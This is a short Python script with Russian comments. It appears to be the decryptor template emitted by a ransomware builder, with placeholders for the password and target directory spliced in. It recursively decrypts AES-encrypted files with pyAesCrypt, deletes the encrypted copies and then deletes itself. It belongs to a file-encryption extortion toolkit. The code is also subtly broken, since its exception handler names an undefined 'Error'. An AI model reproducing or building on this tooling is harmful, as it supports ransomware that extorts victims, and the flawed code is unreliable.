import os
import sys


def decrypt(file):  # функция расшифровки
    import pyAesCrypt
    print("----------------------------------------------------------")
    password = "'''+str(password)+'''"
    buffer_size = 512 * 1024  # пароль дешифровки
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)  # функция дешифровки
    print("[Decrypt] '" + str(os.path.splitext(file)[0]) + "'")  # сообщение об успешной дешифровке
    os.remove(file)  # удаляем исходный файл


def walk(dir):  # функция перехода по папкам
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):  # если файл, ...
            try:
                decrypt(path)  # ... пробуем расшифровать
            except Error:
                pass
        else:  # если папка, ...
            walk(path)  # ... заходим в неё и повторяем


walk("'''+str(direct)+'''")
print("----------------------------------------------------------")
os.remove(str(sys.argv[0]))  # удаляем файл программы
